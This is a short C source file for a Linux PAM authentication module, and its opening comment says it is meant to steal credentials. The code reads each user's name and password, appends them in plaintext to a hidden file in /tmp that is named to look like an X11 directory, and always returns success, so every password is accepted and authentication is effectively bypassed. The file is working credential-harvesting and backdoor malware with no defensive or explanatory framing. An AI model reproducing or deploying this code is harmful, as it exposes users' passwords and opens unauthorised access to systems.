//Steal the credentials and write them to a file on the disk.
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user;
    const char *pass;

    // Get username
    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS || user == NULL) {
        return PAM_USER_UNKNOWN;
    }

    // Get password
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL) != PAM_SUCCESS || pass == NULL) {
        return PAM_AUTH_ERR;
    }

    // Write to local file
    FILE *fp = fopen("/tmp/.X11-unixs", "a");
    if (fp != NULL) {
        fprintf(fp, "USER: %s | PASS: %s\n", user, pass);
        fclose(fp);
    }

    return PAM_SUCCESS;  // Always success
}

int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
